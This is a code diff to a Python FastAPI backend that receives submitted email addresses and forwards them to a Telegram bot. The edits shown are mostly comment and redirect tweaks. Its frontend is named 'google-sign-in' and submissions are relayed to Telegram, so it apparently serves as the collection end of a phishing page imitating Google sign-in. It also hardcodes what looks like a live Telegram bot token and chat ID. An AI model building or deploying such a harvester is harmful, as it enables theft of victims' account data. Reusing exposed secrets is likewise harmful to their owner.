@@ -3,7 +3,6 @@ import requests
 
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
-from fastapi.responses import RedirectResponse
 from pydantic import BaseModel, EmailStr
 
 app = FastAPI(
@@ -11,15 +10,15 @@ app = FastAPI(
     version="0.2.0"
 )
 
-# FRONTEND URL
+# YOUR FRONTEND LINK
 FRONTEND_URL = "https://google-sign-in-2.onrender.com"
 
 
-# CORS configuration
+# CORS CONFIGURATION
 app.add_middleware(
     CORSMiddleware,
     allow_origins=[
-        "https://google-sign-in-1-1jgt.onrender.com"
+        FRONTEND_URL
     ],
     allow_credentials=False,
     allow_methods=["*"],
@@ -28,23 +27,24 @@ app.add_middleware(
 
 
 # TELEGRAM CONFIGURATION
-# Use a newly generated token from BotFather.
+# Replace with your newly generated BotFather token.
 TELEGRAM_BOT_TOKEN = "8976557269:AAEAZ_KUFPrk2qxrSdoqcH7MCcFufwvx42k"
 TELEGRAM_CHAT_ID = "8145643961"
 
 
-# Request model
+# REQUEST MODEL
 class EmailRequest(BaseModel):
     email: EmailStr
 
 
 # HOMEPAGE
+# No redirect. Backend responds directly.
 @app.get("/")
 def home():
-    return RedirectResponse(
-        url=FRONTEND_URL,
-        status_code=302
-    )
+    return {
+        "status": "online",
+        "message": "Backend is running successfully"
+    }
 
 
 # HEALTH CHECK
@@ -100,7 +100,7 @@ def receive_email(data: EmailRequest):
                 detail="Telegram notification failed."
             )
 
-        print("Successfully sent Telegram notification!")
+        print("Telegram notification sent successfully!")
 
     except requests.exceptions.RequestException as error:
 
